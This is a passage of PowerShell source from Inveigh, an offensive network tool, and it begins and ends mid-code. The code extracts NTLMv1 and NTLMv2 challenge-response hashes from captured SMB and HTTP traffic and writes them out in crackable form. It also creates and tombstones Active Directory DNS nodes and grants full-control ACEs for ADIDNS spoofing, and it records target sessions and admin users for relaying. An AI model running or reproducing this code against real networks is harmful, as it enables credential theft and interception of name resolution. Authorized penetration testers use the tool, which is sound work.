        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}
        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}
        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}
        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}

        $relay_object = New-Object PSObject
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerate.Count
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Hostname" $Hostname
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Sessions" $Sessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Users" $AdministratorUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Groups" $AdministratorGroups
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Privileged" $Privileged
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Shares" $Shares
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions" $NetSessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions Mapped" $NetSessionsMapped
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Local Users" $LocalUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB2.1" $SMB2
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Signing" $Signing
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB Server" $SMBServer
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Targeted" $Targeted
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Enumerate" $Enumeration
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execution

        return $relay_object
    }

    function Invoke-SessionUpdate
    {
        param ([String]$domain,[String]$username,[String]$hostname,[String]$IP)

        if($inveigh.domain_mapping_table.$domain)
        {
            $session = ($username + "@" + $inveigh.domain_mapping_table.$domain).ToUpper()
            $hostname_full = ($hostname + "." + $inveigh.domain_mapping_table.$domain).ToUpper()
        }
        else
        {
            $session = $domain + "\" + $username
        }

        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
        {

            if($inveigh.enumerate[$i].Hostname -eq $hostname_full -or $inveigh.enumerate[$i].IP -eq $IP)
            {

                if(!$inveigh.enumerate[$i].Hostname)
                {
                    $inveigh.enumerate[$target_index].Hostname = $hostname_full
                }

                [Array]$session_list = $inveigh.enumerate[$i].Sessions

                if($inveigh.domain_mapping_table.$domain)
                {

                    for($j = 0;$j -lt $session_list.Count;$j++)
                    {

                        if($session_list[$j] -like "$domain\*")
                        {
                            $session_username = ($session_list[$j].Split("\"))[1]
                            $session_update = $session_username + "@" + $inveigh.domain_mapping_table.$domain
                            $session_list[$j] += $session_update
                            $inveigh.enumerate[$i].Sessions = $session_list
                        }

                    }

                }

                if($session_list -notcontains $session)
                {
                    $session_list += $session
                    $inveigh.enumerate[$i].Sessions = $session_list
                }

                $target_updated = $true
                break
            }

        }
     
        if(!$target_updated)
        {
            $inveigh.enumerate.Add((New-RelayEnumObject -IP $IP -Hostname $hostname_full -Sessions $session)) > $null
        }

    }

    

}

# NTLM_functions_scriptblock
$NTLM_functions_scriptblock =
{

    function Get-NTLMResponse
    {
        param ([Byte[]]$Payload,[String]$Capture,[String]$SourceIP,[String]$SourcePort,[String]$Port,[String]$Protocol)

        $payload_converted = [System.BitConverter]::ToString($Payload)
        $payload_converted = $payload_converted -replace "-",""
        $NTLMSSP_hex_offset = $payload_converted.IndexOf("4E544C4D53535000")
        $session = "$SourceIP`:$SourcePort"

        if($NTLMSSP_hex_offset -ge 0 -and $payload_converted.SubString(($NTLMSSP_hex_offset + 16),8) -eq "03000000")
        {
            $NTLMSSP_offset = $NTLMSSP_hex_offset / 2
            $LM_length = Get-UInt16DataLength ($NTLMSSP_offset + 12) $Payload
            $LM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 16) $Payload
            $LM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $LM_offset)..($NTLMSSP_offset + $LM_offset + $LM_length - 1)]) -replace "-",""
            $NTLM_length = Get-UInt16DataLength ($NTLMSSP_offset + 20) $Payload
            $NTLM_offset = Get-UInt32DataLength ($NTLMSSP_offset + 24) $Payload
            $NTLM_response = [System.BitConverter]::ToString($Payload[($NTLMSSP_offset + $NTLM_offset)..($NTLMSSP_offset + $NTLM_offset + $NTLM_length - 1)]) -replace "-",""
            $domain_length = Get-UInt16DataLength ($NTLMSSP_offset + 28) $Payload
            $domain_offset = Get-UInt32DataLength ($NTLMSSP_offset + 32) $Payload

            if($domain_length -gt 0)
            {
                $NTLM_domain_string = Convert-DataToString ($NTLMSSP_offset + $domain_offset) $domain_length $Payload
            }

            $user_length = Get-UInt16DataLength ($NTLMSSP_offset + 36) $Payload
            $user_offset = Get-UInt32DataLength ($NTLMSSP_offset + 40) $Payload
            $NTLM_user_string = Convert-DataToString ($NTLMSSP_offset + $user_offset) $user_length $Payload
            $host_length = Get-UInt16DataLength ($NTLMSSP_offset + 44) $Payload
            $host_offset = Get-UInt32DataLength ($NTLMSSP_offset + 48) $Payload
            $NTLM_host_string = Convert-DataToString ($NTLMSSP_offset + $host_offset) $host_length $Payload

            if($Protocol -eq "SMB")
            {
                $NTLM_challenge = $inveigh.SMB_session_table.$session
            }
            else
            {
                $NTLM_challenge = $inveigh.HTTP_session_table.$session
            }
            
            if($NTLM_length -gt 24)
            {

                if($NTLM_challenge)
                {

                    $NTLMv2_response = $NTLM_response.Insert(32,':')
                    $NTLMv2_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLMv2_response

                    if($Capture -eq 'Y')
                    {

                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                        {
                            $inveigh.NTLMv2_list.Add($NTLMv2_hash) > $null

                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
                                $inveigh.output_queue.Add($NTLMv2_hash) > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
                            {
                                $inveigh.NTLMv2_file_queue.Add($NTLMv2_hash) > $null
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 written to " + "Inveigh-NTLMv2.txt") > $null
                            }

                            if($inveigh.NTLMv2_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
                            {
                                $inveigh.NTLMv2_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
                            }

                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
                            {
                                $inveigh.IP_capture_list.Add($SourceIP) > $null
                            }

                        }
                        else
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
                        }

                    }
                    else
                    {
                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                    }

                }
                else
                {
                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv2 challenge missing for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort") > $null    
                }

            }
            elseif($NTLM_length -eq 24)
            {

                if($NTLM_challenge)
                {

                    $NTLMv1_hash = $NTLM_user_string + "::" + $NTLM_domain_string + ":" + $LM_response + ":" + $NTLM_response + ":" + $NTLM_challenge

                    if($Capture -eq 'Y')
                    {

                        if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $NTLM_user_string.EndsWith('$')))
                        {
                            $inveigh.NTLMv1_list.Add($NTLMv1_hash) > $null

                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string"))
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:") > $null
                                $inveigh.output_queue.Add($NTLMv1_hash) > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] SMB($Port) NTLMv1 captured for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[not unique]") > $null
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")))
                            {
                                $inveigh.NTLMv1_file_queue.Add($NTLMv1_hash) > $null
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] SMB($Port) NTLMv1 written to " + "Inveigh-NTLMv1.txt") > $null
                            }

                            if($inveigh.NTLMv1_username_list -notcontains "$SourceIP $NTLM_domain_string\$NTLM_user_string")
                            {
                                $inveigh.NTLMv1_username_list.Add("$SourceIP $NTLM_domain_string\$NTLM_user_string") > $null
                            }

                            if($inveigh.IP_capture_list -notcontains $SourceIP -and -not $NTLM_user_string.EndsWith('$') -and !$inveigh.spoofer_repeat -and $SourceIP -ne $IP)
                            {
                                $inveigh.IP_capture_list.Add($SourceIP) > $null
                            }

                        }
                        else
                        {
                            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[machine account]") > $null    
                        }

                    }
                    else
                    {
                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 ignored for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort`:`n[capture disabled]") > $null    
                    }

                }
                else
                {
                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] $Protocol($Port) NTLMv1 challenge missing for $NTLM_domain_string\$NTLM_user_string from $SourceIP($NTLM_host_string)`:$SourcePort") > $null    
                }

            }
            elseif($NTLM_length -eq 0)
            {
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $Protocol($Port) NTLM null response from $SourceIP($NTLM_host_string)`:$SourcePort") > $null
            }

            Invoke-SessionUpdate $NTLM_domain_string $NTLM_user_string $NTLM_host_string $source_IP
        }

    }

}

# ADIDNS Functions ScriptBlock
$ADIDNS_functions_scriptblock =
{

    function Disable-ADIDNSNode
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$Partition = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $SOASerialNumberArray = New-SOASerialNumberArray -DomainController $DomainController -Zone $Zone

        $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        $DC_array = $Domain.Split(".")

        foreach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        if($Credential)
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
        }

        $timestamp = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date "1/1/1601").Ticks)
        $timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($timestamp))
        $timestamp = $timestamp.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}

        [Byte[]]$DNS_record = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
            $SOASerialNumberArray[0..3] +
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
            $timestamp

        try
        {
            $directory_entry.InvokeSet('dnsRecord',$DNS_record)
            $directory_entry.InvokeSet('dnsTombstoned',$true)
            $directory_entry.SetInfo()
            $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node $Node tombstoned in $Zone") > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        if($directory_entry.Path)
        {
            $directory_entry.Close()
        }

    }

    function Enable-ADIDNSNode
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,    
            [parameter(Mandatory=$false)][String]$DistinguishedName,
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$Partition = "DomainDNSZones",
            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$Type = "A",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Byte[]]$DNSRecord,
            [parameter(Mandatory=$false)][Int]$Preference,
            [parameter(Mandatory=$false)][Int]$Priority,
            [parameter(Mandatory=$false)][Int]$Weight,
            [parameter(Mandatory=$false)][Int]$Port,
            [parameter(Mandatory=$false)][Int]$TTL = 600,
            [parameter(Mandatory=$false)][Int32]$SOASerialNumber,
            [parameter(Mandatory=$false)][Switch]$Static,
            [parameter(Mandatory=$false)][Switch]$Tombstone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        $DC_array = $Domain.Split(".")

        foreach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Type $Type -TTL $TTL -Zone $Zone

        if($Credential)
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
        }

        try
        {
            $directory_entry.InvokeSet('dnsRecord',$DNSRecord)
            $directory_entry.SetInfo()
            $success = $true
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $Node added to $Zone") > $null;
            $inveigh.ADIDNS_table.$Node = "1"
        }
        catch
        {
            $success = $false
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $inveigh.ADIDNS_table.$Node = "0"
        }

        if($directory_entry.Path)
        {
            $directory_entry.Close()
        }

        return $success
    }

    function Get-ADIDNSNodeTombstoned
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$DistinguishedName,
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$Partition = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        $DC_array = $Domain.Split(".")

        foreach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        if($Credential)
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
        }

        try
        {
            $dnsTombstoned = $directory_entry.InvokeGet('dnsTombstoned')
            $dnsRecord = $directory_entry.InvokeGet('dnsRecord')
        }
        catch
        {

            if($_.Exception.Message -notlike '*Exception calling "InvokeGet" with "1" argument(s): "The specified directory service attribute or value does not exist.*' -and
            $_.Exception.Message -notlike '*The following exception occurred while retrieving member "InvokeGet": "The specified directory service attribute or value does not exist.*')
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            }

        }

        if($directory_entry.Path)
        {
            $directory_entry.Close()
        }

        $node_tombstoned = $false

        if($dnsTombstoned -and $dnsRecord)
        {

            if($dnsRecord[0].GetType().name -eq [Byte])
            {

                if($dnsRecord.Count -ge 32 -and $dnsRecord[2] -eq 0)
                {
                    $node_tombstoned = $true
                }

            }

        }

        return $node_tombstoned
    }

    function Grant-ADIDNSPermission
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
            "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
            "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$Access = "GenericAll",
            [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",    
            [parameter(Mandatory=$false)][String]$DistinguishedName,
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$false)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$Partition = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Principal,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
            [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
        )

        if($Partition -eq 'System')
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
        }
        else
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        }

        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        if($Credential)
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
        }
        else
        {
            $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
        }

        try
        {
            $NT_account = New-Object System.Security.Principal.NTAccount($Principal)
            $principal_SID = $NT_account.Translate([System.Security.Principal.SecurityIdentifier])
            $principal_identity = [System.Security.Principal.IdentityReference]$principal_SID
            $AD_rights = [System.DirectoryServices.ActiveDirectoryRights]$Access
            $access_control_type = [System.Security.AccessControl.AccessControlType]$Type
            $AD_security_inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
            $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($principal_identity,$AD_rights,$access_control_type,$AD_security_inheritance)
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        try
        {
            $directory_entry.psbase.ObjectSecurity.AddAccessRule($ACE)
            $directory_entry.psbase.CommitChanges()
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Full Control ACE added for $Principal to $Node DACL") > $null
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
        }

        if($directory_entry.Path)
        {
            $directory_entry.Close()
        }

        return $output
    }
    
    function New-ADIDNSNode
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,    
            [parameter(Mandatory=$false)][String]$DistinguishedName,
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$false)][String]$Forest,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]$Partition = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]$Type,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$TTL,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")

        $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        $DC_array = $Domain.Split(".")

        foreach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        [Byte[]]$DNSRecord = New-DNSRecordArray -Data $Data -DomainController $DomainController -Type $Type -TTL $TTL -Zone $Zone
        $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DomainController,389)

        if($Credential)
        {
            $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier,$Credential.GetNetworkCredential())
        }
        else
        {
            $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)
        }

        $object_category = "CN=Dns-Node,CN=Schema,CN=Configuration"
        $forest_array = $Forest.Split(".")

        foreach($DC in $forest_array)
        {
            $object_category += ",DC=$DC"
        }
        
        try
        {
            $connection.SessionOptions.Sealing = $true
            $connection.SessionOptions.Signing = $true
            $connection.Bind()
            $request = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
            $request.DistinguishedName = $distinguished_name
            $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass",@("top","dnsNode"))) > $null
            $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectCategory",$object_category)) > $null
            $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dnsRecord",$DNSRecord)) > $null
            $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "dNSTombstoned","TRUE")) > $null
            $connection.SendRequest($request) > $null
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS node $Node type $Type added to $Zone") > $null
            $output = $true
            $inveigh.ADIDNS_table.$Node = "1"
        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $output = $false

            if($_.Exception.Message -ne 'Exception calling "SendRequest" with "1" argument(s): "The object exists."')
            {
                $inveigh.ADIDNS = $null
                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                $inveigh.ADIDNS_table.$Node = "0"
            }

        }

        return $output
    }

    function New-SOASerialNumberArray
    {

        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$false)][String]$Zone
        )

        $Zone = $Zone.ToLower()

        function Convert-DataToUInt16($Field)
        {
            [Array]::Reverse($Field)
            return [System.BitConverter]::ToUInt16($Field,0)
        }

        function ConvertFrom-PacketOrderedDictionary($OrderedDictionary)
        {

            foreach($field in $OrderedDictionary.Values)
            {
                $byte_array += $field
            }

            return $byte_array
        }

        function New-RandomByteArray
        {
            param([Int]$Length,[Int]$Minimum=1,[Int]$Maximum=255)

            [String]$random = [String](1..$Length | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum $Minimum -Maximum $Maximum)})
            [Byte[]]$random = $random.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            return $random
        }

        function New-DNSNameArray
        {
            param([String]$Name)

            $character_array = $Name.ToCharArray()
            [Array]$index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}

            if($index_array.Count -gt 0)
            {

                $name_start = 0

                foreach($index in $index_array)
                {
                    $name_end = $index - $name_start
                    [Byte[]]$name_array += $name_end
                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
                    $name_start = $index + 1
                }

                [Byte[]]$name_array += ($Name.Length - $name_start)
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }
            else
            {
                [Byte[]]$name_array = $Name.Length
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }

            return $name_array
        }

        function New-PacketDNSSOAQuery
        {
            param([String]$Name)

            [Byte[]]$type = 0x00,0x06
            [Byte[]]$name = (New-DNSNameArray $Name) + 0x00
            [Byte[]]$length = [System.BitConverter]::GetBytes($Name.Count + 16)[1,0]
            [Byte[]]$transaction_ID = New-RandomByteArray 2
            $DNSQuery = New-Object System.Collections.Specialized.OrderedDictionary
            $DNSQuery.Add("Length",$length)
            $DNSQuery.Add("TransactionID",$transaction_ID)
            $DNSQuery.Add("Flags",[Byte[]](0x01,0x00))
            $DNSQuery.Add("Questions",[Byte[]](0x00,0x01))
            $DNSQuery.Add("AnswerRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("AuthorityRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("AdditionalRRs",[Byte[]](0x00,0x00))
            $DNSQuery.Add("Queries_Name",$name)
            $DNSQuery.Add("Queries_Type",$type)
            $DNSQuery.Add("Queries_Class",[Byte[]](0x00,0x01))

            return $DNSQuery
        }

        $DNS_client = New-Object System.Net.Sockets.TCPClient
        $DNS_client.Client.ReceiveTimeout = 3000

        try
        {
            $DNS_client.Connect($DomainController,"53")
            $DNS_client_stream = $DNS_client.GetStream()
            $DNS_client_receive = New-Object System.Byte[] 2048
            $packet_DNSQuery = New-PacketDNSSOAQuery $Zone
            [Byte[]]$DNS_client_send = ConvertFrom-PacketOrderedDictionary $packet_DNSQuery
            $DNS_client_stream.Write($DNS_client_send,0,$DNS_client_send.Length) > $null
            $DNS_client_stream.Flush()   
            $DNS_client_stream.Read($DNS_client_receive,0,$DNS_client_receive.Length) > $null
            $DNS_client.Close()
            $DNS_client_stream.Close()

            if($DNS_client_receive[9] -eq 0)
            {
                $inveigh.output_queue.Add("[-] $Zone SOA record not found") > $null
            }
            else
            {
                $DNS_reply_converted = [System.BitConverter]::ToString($DNS_client_receive)
                $DNS_reply_converted = $DNS_reply_converted -replace "-",""
                $SOA_answer_index = $DNS_reply_converted.IndexOf("C00C00060001")
                $SOA_answer_index = $SOA_answer_index / 2
                $SOA_length = $DNS_client_receive[($SOA_answer_index + 10)..($SOA_answer_index + 11)]
                $SOA_length = Convert-DataToUInt16 $SOA_length
                [Byte[]]$SOA_serial_current_array = $DNS_client_receive[($SOA_answer_index + $SOA_length - 8)..($SOA_answer_index + $SOA_length - 5)]
                $SOA_serial_current = [System.BitConverter]::ToUInt32($SOA_serial_current_array[3..0],0) + 1
                [Byte[]]$SOA_serial_number_array = [System.BitConverter]::GetBytes($SOA_serial_current)[0..3]
            }

        }
        catch
        {
            $inveigh.output_queue.Add("[-] $DomainController did not respond on TCP port 53") > $null
        }

        return [Byte[]]$SOA_serial_number_array
    }

    function New-DNSRecordArray
    {
        [CmdletBinding()]
        [OutputType([Byte[]])]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$Type = "A",
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$Preference,
            [parameter(Mandatory=$false)][Int]$Priority,
            [parameter(Mandatory=$false)][Int]$Weight,
            [parameter(Mandatory=$false)][Int]$Port,
            [parameter(Mandatory=$false)][Int]$TTL = 600,
            [parameter(Mandatory=$false)][Int32]$SOASerialNumber,
            [parameter(Mandatory=$false)][Switch]$Static,
            [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
        )

        $SOASerialNumberArray = New-SOASerialNumberArray -DomainController $DomainController -Zone $Zone

        function New-DNSNameArray
        {
            param([String]$Name)

            $character_array = $Name.ToCharArray()
            [Array]$index_array = 0..($character_array.Count - 1) | Where-Object {$character_array[$_] -eq '.'}

            if($index_array.Count -gt 0)
            {

                $name_start = 0

                foreach($index in $index_array)
                {
                    $name_end = $index - $name_start
                    [Byte[]]$name_array += $name_end
                    [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
                    $name_start = $index + 1
                }

